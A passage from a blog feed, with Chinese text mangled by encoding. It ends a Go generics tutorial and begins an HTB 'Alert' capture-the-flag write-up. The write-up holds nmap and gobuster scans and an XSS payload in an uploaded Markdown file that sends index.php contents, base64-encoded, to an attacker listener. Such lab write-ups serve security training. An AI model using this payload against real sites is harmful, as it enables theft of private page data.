&#123;<br><span class="hljs-keyword">return</span> p.msg<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> s SayAble[<span class="hljs-type">string</span>]<br>s = Person[<span class="hljs-type">string</span>]&#123;<span class="hljs-string">&quot;sad&quot;</span>&#125;<br>fmt.Println(s.Say())<br>&#125;<br>&gt;&gt; sad<br></code></pre></td></tr></table></figure><h2 id="æ³›å‹æ¥å£"><a href="#æ³›å‹æ¥å£" class="headerlink" title="æ³›å‹æ¥å£"></a>æ³›å‹æ¥å£</h2><p>æ³›å‹æ¥å£</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PrintObj</span>[<span class="hljs-title">T</span> <span class="hljs-title">fmt</span>.<span class="hljs-title">Stringer</span>]<span class="hljs-params">(s T)</span></span> &#123;<br>fmt.Println(s.String())<br>&#125;<br><br><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>Name <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person)</span></span> String() <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Sprintf(<span class="hljs-string">&quot;Person: %s&quot;</span>, p.Name)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>PrintObj(Person&#123;Name: <span class="hljs-string">&quot;butt3rf1y&quot;</span>&#125;)<br>&#125;<br>&gt;&gt;<br>Person: butt3rf1y<br></code></pre></td></tr></table></figure><p>éæ³›å‹æ¥å£ä¹Ÿèƒ½ä½œä¸ºæ³›å‹çš„ç±»å‹å½¢å‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Write</span>[<span class="hljs-title">W</span> <span class="hljs-title">io</span>.<span class="hljs-title">Writer</span>]<span class="hljs-params">(w W, bs []<span class="hljs-type">byte</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> w.Write(bs)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ³›å‹æ–­è¨€"><a href="#æ³›å‹æ–­è¨€" class="headerlink" title="æ³›å‹æ–­è¨€"></a>æ³›å‹æ–­è¨€</h2><p>ç±»å‹æ–­è¨€æ˜¯å°†æ¥å£ç±»å‹çš„å˜é‡è½¬æ¢ä¸ºå…·ä½“ç±»å‹</p><p>å¯ä»¥ç”¨æ³›å‹æ¥å¯¹ <code>any</code> ç±»å‹è¿›è¡Œç±»å‹æ–­è¨€</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Assert</span>[<span class="hljs-title">T</span> <span class="hljs-title">any</span>]<span class="hljs-params">(v any)</span></span> (<span class="hljs-type">bool</span>, T) &#123;<br><span class="hljs-keyword">var</span> av T<br><span class="hljs-keyword">if</span> v == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, av<br>&#125;<br>av, ok := v.(T)<br><span class="hljs-keyword">return</span> ok, av<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ç±»å‹é›†"><a href="#ç±»å‹é›†" class="headerlink" title="ç±»å‹é›†"></a>ç±»å‹é›†</h2><p>type set åªèƒ½ç”¨äºæ³›å‹ä¸­çš„ç±»å‹çº¦æŸï¼Œä¸èƒ½åšç±»å‹å£°æ˜ï¼Œç±»å‹æ–­è¨€ã€‚</p><h3 id="å¹¶é›†"><a href="#å¹¶é›†" class="headerlink" title="å¹¶é›†"></a>å¹¶é›†</h3><p>æ¥å£ç±»å‹ <code>SignedInt</code> æ˜¯ä¸€ä¸ªç±»å‹é›†ï¼Œæœ‰ç¬¦å·æ•´æ•°ç±»å‹çš„å¹¶é›†å°±æ˜¯ <code>SignedInt</code> ï¼Œæ‰€ä»¥ <code>SignedInt</code> å°±æ˜¯å¥¹ä»¬çš„è¶…é›†</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> SignedInt <span class="hljs-keyword">interface</span> &#123;<br>   <span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä»–é€šç”¨æ¥å£ä¹Ÿæ˜¯è¿™æ ·</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> SignedInt <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span><br>&#125;<br><span class="hljs-keyword">type</span> UnSignedInt <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span><br>&#125;<br><span class="hljs-keyword">type</span> Integer <span class="hljs-keyword">interface</span> &#123;<br>SignedInt | UnSignedInt<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="äº¤é›†"><a href="#äº¤é›†" class="headerlink" title="äº¤é›†"></a>äº¤é›†</h3><p>æ˜¾è€Œæ˜“è§äº¤é›†ä¸º <code>SignedInt</code>ï¼Œå¹¶ä¸”å› ä¸º <code>Do[uint](2)</code> ç±»å‹ä¸º <code>uint</code> æ‰€ä»¥æ— æ³•é€šè¿‡ç¼–è¯‘ï¼Œåªæœ‰äº¤é›†ä¸­æ‰èƒ½é€šè¿‡ç¼–è¯‘</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> SignedInt <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span><br>&#125;<br><span class="hljs-keyword">type</span> Integer <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span> | <span class="hljs-type">uint8</span> | <span class="hljs-type">uint16</span> | <span class="hljs-type">uint</span> | <span class="hljs-type">uint32</span> | <span class="hljs-type">uint64</span><br>&#125;<br><span class="hljs-keyword">type</span> Number <span class="hljs-keyword">interface</span> &#123;<br>SignedInt<br>Integer<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Do</span>[<span class="hljs-title">T</span> <span class="hljs-title">Number</span>]<span class="hljs-params">(n T)</span></span> T &#123;<br><span class="hljs-keyword">return</span> n<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>Do[<span class="hljs-type">int</span>](<span class="hljs-number">2</span>)<br>Do[<span class="hljs-type">uint</span>](<span class="hljs-number">2</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç©ºé›†"><a href="#ç©ºé›†" class="headerlink" title="ç©ºé›†"></a>ç©ºé›†</h3><p>åƒä¸‹é¢è¿™æ ·ï¼Œç©ºé›†å°±æ˜¯æ²¡æœ‰äº¤é›†</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> SignedInt <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span><br>&#125;<br><span class="hljs-keyword">type</span> UnsignedInt <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">uint8</span> | <span class="hljs-type">uint16</span> | <span class="hljs-type">uint</span> | <span class="hljs-type">uint32</span> | <span class="hljs-type">uint64</span><br>&#125;<br><span class="hljs-keyword">type</span> Integer <span class="hljs-keyword">interface</span> &#123;<br>SignedInt<br>UnsignedInt<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åº•å±‚ç±»å‹"><a href="#åº•å±‚ç±»å‹" class="headerlink" title="åº•å±‚ç±»å‹"></a>åº•å±‚ç±»å‹</h3><p><code>type</code> å…³é”®å­—å£°æ˜æ–°ç±»å‹æ—¶ï¼Œå…¶åº•å±‚ç±»å‹å³ä½¿åŒ…å«åœ¨ç±»å‹é›†å†…ï¼Œä¼ å…¥æ—¶ä¹Ÿä¸èƒ½é€šè¿‡ç¼–è¯‘</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Int <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-type">int8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">int</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span> | <span class="hljs-type">uint8</span> | <span class="hljs-type">int16</span> | <span class="hljs-type">uint</span> | <span class="hljs-type">uint32</span> | <span class="hljs-type">uint64</span><br>&#125;<br><span class="hljs-keyword">type</span> TinyInt <span class="hljs-type">int8</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Do</span>[<span class="hljs-title">T</span> <span class="hljs-title">Int</span>]<span class="hljs-params">(n T)</span></span> &#123;<br><span class="hljs-keyword">return</span> n<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>Do[TinyInt](<span class="hljs-number">1</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ç±»å‹å‰åŠ ä¸Š <code>~</code> è¡¨ç¤ºåº•å±‚ç±»å‹ï¼Œå¦‚æœä¸€ä¸ªç±»å‹çš„åº•å±‚ç±»å‹å±äºè¯¥ç±»å‹é›†ï¼Œé‚£ä¹ˆè¯¥ç±»å‹å°±å±äºç±»å‹é›†ã€‚è¿™æ ·å°±èƒ½é€šè¿‡ç¼–è¯‘äº†</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Int <span class="hljs-keyword">interface</span> &#123;<br>~<span class="hljs-type">int8</span> | ~<span class="hljs-type">int16</span> | ~<span class="hljs-type">int</span> | ~<span class="hljs-type">int32</span> | ~<span class="hljs-type">int64</span> | ~<span class="hljs-type">uint8</span> | ~<span class="hljs-type">uint16</span> | ~<span class="hljs-type">uint</span> | ~<span class="hljs-type">uint32</span> | ~<span class="hljs-type">uint64</span><br>&#125;<br><span class="hljs-keyword">type</span> TinyInt <span class="hljs-type">int8</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Do</span>[<span class="hljs-title">T</span> <span class="hljs-title">Int</span>]<span class="hljs-params">(n T)</span></span> T &#123;<br><span class="hljs-keyword">return</span> n<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>Do[TinyInt](<span class="hljs-number">1</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ³›å‹çš„ä½¿ç”¨"><a href="#æ³›å‹çš„ä½¿ç”¨" class="headerlink" title="æ³›å‹çš„ä½¿ç”¨"></a>æ³›å‹çš„ä½¿ç”¨</h2><h3 id="é˜Ÿåˆ—"><a href="#é˜Ÿåˆ—" class="headerlink" title="é˜Ÿåˆ—"></a>é˜Ÿåˆ—</h3><p>é˜Ÿåˆ—ä¸­çš„å…ƒç´ æ˜¯ä»»æ„çš„ï¼Œæ‰€ä»¥ç±»å‹çº¦æŸä¸º <code>any</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Queue[T any] []T<br></code></pre></td></tr></table></figure><p>æ€»å…±æœ‰å››ä¸ªæ–¹æ³• <code>Pop</code>ï¼Œ<code>Peek</code>ï¼Œ<code>Push</code>ï¼Œ<code>Size</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Queen[T any] []T<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(q *Queen[T])</span></span> Push(e T) &#123;<br>*q = <span class="hljs-built_in">append</span>(*q, e)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(q *Queen[T])</span></span> Pop(e T) (_ T) &#123;<br><span class="hljs-keyword">if</span> q.Size() &gt; <span class="hljs-number">0</span> &#123;<br>res := q.Peek()<br>*q = (*q)[<span class="hljs-number">1</span>:]<br><span class="hljs-keyword">return</span> res<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(q *Queen[T])</span></span> Peek() (_ T) &#123;<br><span class="hljs-keyword">if</span> q.Size() &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> (*q)[<span class="hljs-number">0</span>]<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(q *Queen[T])</span></span> Size() <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(*q)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Pop</code>  å’Œ <code>Peek</code> æ–¹æ³•ä¸­è¿”å›å€¼æ˜¯ <code>_T</code> ï¼Œè¡¨ç¤ºæ³›å‹é›¶å€¼ï¼Œå½“é˜Ÿåˆ—ä¸ºç©ºæ—¶ï¼Œéœ€è¦è¿”å›é›¶å€¼ï¼Œä½†ä¸çŸ¥é“ç±»å‹ä¸èƒ½è¿”å›å…·ä½“ç±»å‹ï¼Œæ‰€ä»¥è¿”å›æ³›å‹é›¶å€¼ã€‚å¯¹äºæ³›å‹å˜é‡ï¼Œé»˜è®¤çš„å€¼å°±æ˜¯è¯¥ç±»å‹çš„é›¶å€¼</p><h3 id="å †"><a href="#å †" class="headerlink" title="å †"></a>å †</h3><p>å †çš„å…ƒç´ å¿…é¡»æ˜¯å¯æ’åºçš„ç±»å‹ï¼Œå†…ç½®çš„å¯æ’åºç±»å‹åªæœ‰æ•°å­—å’Œå­—ç¬¦ä¸²ï¼Œåˆå§‹åŒ–æ—¶éœ€è¦ä¼ å…¥ä¸€ä¸ªè‡ªå®šä¹‰çš„æ¯”è¾ƒå™¨ï¼Œæ¯”è¾ƒå™¨å¿…é¡»ä½¿ç”¨æ³›å‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Comparator[T any] <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(a, b T)</span></span> <span class="hljs-type">int</span><br></code></pre></td></tr></table></figure><h3 id="å¯¹è±¡æ± "><a href="#å¯¹è±¡æ± " class="headerlink" title="å¯¹è±¡æ± "></a>å¯¹è±¡æ± </h3><p>å¤ç”¨ <code>*bytes.Buffer</code> å¯¹è±¡</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bytes&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPool</span>[<span class="hljs-title">T</span> <span class="hljs-title">any</span>]<span class="hljs-params">(newFn <span class="hljs-keyword">func</span>()</span></span> T) *Pool[T] &#123;<br><span class="hljs-keyword">return</span> &amp;Pool[T]&#123;<br>pool: &amp;sync.Pool&#123;<br>New: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-keyword">interface</span>&#123;&#125; &#123;<br><span class="hljs-keyword">return</span> newFn()<br>&#125;,<br>&#125;,<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">type</span> Pool[T any] <span class="hljs-keyword">struct</span> &#123;<br>pool *sync.Pool<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Pool[T])</span></span> Put(v T) &#123;<br>p.pool.Put(v)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Pool[T])</span></span> Get() T &#123;<br><span class="hljs-keyword">var</span> v T<br>get := p.pool.Get()<br><span class="hljs-keyword">if</span> get != <span class="hljs-literal">nil</span> &#123;<br>v, _ = get.(T)<br>&#125;<br><span class="hljs-keyword">return</span> v<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>bufferPool := NewPool(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> *bytes.Buffer &#123;<br><span class="hljs-keyword">return</span> bytes.NewBuffer(<span class="hljs-literal">nil</span>)<br>&#125;)<br><br><span class="hljs-keyword">for</span> <span class="hljs-keyword">range</span> <span class="hljs-number">5</span> &#123;<br>buffer := bufferPool.Get()<br>buffer.WriteString(<span class="hljs-string">&quot;sad&quot;</span>)<br>fmt.Println(buffer.String())<br>buffer.Reset()<br>bufferPool.Put(buffer)<br>&#125;<br>&#125;<br>&gt;&gt;<br>sad<br>sad<br>sad<br>sad<br>sad<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>è¯­è¨€</category>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Alert</title>
    <link href="/2025/03/23/HTB-Alert/"/>
    <url>/2025/03/23/HTB-Alert/</url>
    
    <content type="html"><![CDATA[<p>XSS</p><span id="more"></span><h1 id="Submit-User-Flag"><a href="#Submit-User-Flag" class="headerlink" title="Submit User Flag"></a>Submit User Flag</h1><p>å…ˆæ‰«</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€# nmap -sS -sV -A -Pn 10.10.11.44<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-23 14:53 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.44<br>Host is up (0.35s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)<br>|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)<br>|_  256 cb:92:ad:6b:<span class="hljs-built_in">fc</span>:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-title: Did not follow redirect to http://alert.htb/<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.94SVN%E=4%D=3/23%OT=22%CT=1%CU=39522%PV=Y%DS=3%DC=T%G=Y%TM=67DF<br>OS:B016%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)<br>OS:OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53A<br>OS:ST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)<br>OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%<br>OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T<br>OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=<br>OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF<br>OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=7FA%RUD=G)IE(R=Y%DFI=N%T=<br>OS:40%CD=S)<br><br>Network Distance: 3 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port 443/tcp)<br>HOP RTT       ADDRESS<br>1   0.27 ms   172.30.144.1<br>2   298.79 ms 10.10.16.1<br>3   368.82 ms 10.10.11.44<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 55.07 seconds<br></code></pre></td></tr></table></figure><p>è®¿é—® web ç½‘é¡µå‘ç°æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œåªèƒ½ä¸Šä¼  md æ–‡ä»¶ï¼Œä¸Šä¼ ä¸€ä¸ªå¸¦æœ‰ xss çš„æ–‡ä»¶ï¼Œèƒ½æˆåŠŸæ‰§è¡Œ xss</p><p>æ‰«ä¸€ä¸‹ç›®å½•æœ‰å‡ ä¸ª php æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://alert.htb  -x php,.txt<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/7e86d1c0f62c38d9.png"></p><p>ä¸Šä¼ ä¹‹åç‚¹å‡» <code>Share Markdown</code> å°†ç”Ÿæˆçš„ URL åœ¨ <code>Contact Us</code> æ¿å—è¿›è¡Œå‘é€</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://alert.htb/index.php&quot;</span>)<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">resp</span> =&gt;</span> resp.<span class="hljs-title function_">text</span>())<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> &#123;<br>            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`http://10.10.16.15:1234/?text=<span class="hljs-subst">$&#123;btoa(text)&#125;</span>`</span>);<br>        &#125;)<br>        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> &#123;<br>            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`http://10.10.16.15:1234/?err=<span class="hljs-subst">$&#123;err&#125;</span>`</span>);<br>        &#125;);<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>ä¸Šä¼ ä¹‹åç‚¹å‡» <code>Share Markdown</code> å°†ç”Ÿæˆçš„ URL åœ¨ <code>Contact Us</code> æ¿å—è¿›è¡Œå‘é€</p><p><img src="https://img.dkdun.cn/v1/2025/12/9ef075b6f0fd21b5.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/831fe72fbafec063.png"></p><p>å¯åŠ¨ç›‘å¬</p><p><img src="https://img.dkdun.cn/v1/2025/12/ee5b913233e2c638.png"></p><p>è§£ç å¾—åˆ°</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 